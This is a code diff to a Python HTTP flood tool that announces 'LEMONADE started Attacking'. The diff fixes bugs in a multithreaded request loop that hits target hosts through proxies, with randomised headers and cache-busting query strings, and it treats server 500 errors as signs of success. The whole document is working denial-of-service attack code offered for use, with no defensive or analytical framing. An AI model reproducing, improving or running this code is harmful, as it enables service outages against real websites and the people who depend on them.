@@ -68,7 +68,7 @@ if(config["useconfigurl"] == False):
     host = []
     host.append(m.group(2))
 else:
-    url = list(config["url"])
+    url = config["url"]
     for i in range(len(url)):
         k = url[i]
         if str(k).count("/")==2:
@@ -94,7 +94,6 @@ class httpcall(threading.Thread):
         threading.Thread.__init__(self)
         self.randomdelay = config["thread"]["randomdelay"]
         self.payload = str(config["payload"])
-        self.json = str(config["json"])
         self.useragents = useragents
         self.referers = referers
         self.limiter = config["thread"]["limiter"]
@@ -133,7 +132,7 @@ class httpcall(threading.Thread):
                             "Keep-Alive": str(random.randint(110,120)),
                             "Connection": "keep-alive",
                             "Host": host[k]
-                        }, data=self.payload, json=self.json, timeout=self.timeout)
+                        }, data=self.payload, timeout=self.timeout)
                         proxies.append(proxy)
                         if str(lres.status_code).startswith("50"):
                             set_flag(1)
@@ -145,13 +144,14 @@ class httpcall(threading.Thread):
                         elif isignorestatus(lres.status_code):
                             requestcnt()
                         else:
-                            print("A request error has occurred. StatusCode:"+lres.status_code+" "+host[k])
+                            print("A request error has occurred. StatusCode:"+str(lres.status_code)+" "+host[k])
                             s = url[k]
                             b = host[k]
                             url.remove(s)
                             host.remove(b)
                     except:
-                        pass
+                        if len(url) == 0:
+                            set_flag(2)
                 else:
                     try:
                         lres = requests.request(self.method,f"{url[k]}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
@@ -162,13 +162,13 @@ class httpcall(threading.Thread):
                             "Keep-Alive": str(random.randint(110,120)),
                             "Connection": "keep-alive",
                             "Host": host[k]
-                        }, data=self.payload, json=self.json, timeout=self.timeout, proxies={
+                        }, data=self.payload, timeout=self.timeout, proxies={
                             "http":"http://"+proxy,
                             "https":"http://"+proxy,
                         })
                         proxies.append(proxy)
                         if str(lres.status_code).startswith("50"):
-                            set_flag(1)
+                            #set_flag(1)
                             print("Res 500 "+host[k])
                             s = url[k]
                             b = host[k]
@@ -177,13 +177,14 @@ class httpcall(threading.Thread):
                         elif isignorestatus(lres.status_code):
                             requestcnt()
                         else:
-                            print("A request error has occurred. StatusCode:"+lres.status_code+" "+host[k])
+                            print("A request error has occurred. StatusCode:"+str(lres.status_code)+" "+host[k])
                             s = url[k]
                             b = host[k]
                             url.remove(s)
                             host.remove(b)
                     except:
-                        pass
+                        if len(url) == 0:
+                            set_flag(2)
             if self.nodelay == True:
                 continue
             elif self.limiter == True:
@@ -206,10 +207,13 @@ class MonitorThread(threading.Thread):
             print(f"Summary Requested: {request_counter}")
             time.sleep(5)
 
-
+print(url)
+print(host)
+print("LEMONADE started Attacking")
 MonitorThread().start()
 for i in range(thrd):
     httpcall().start()
+#print("Success fully started all threads")
 try:
     while True:
         #print(f"Summary Requested: {request_counter}")
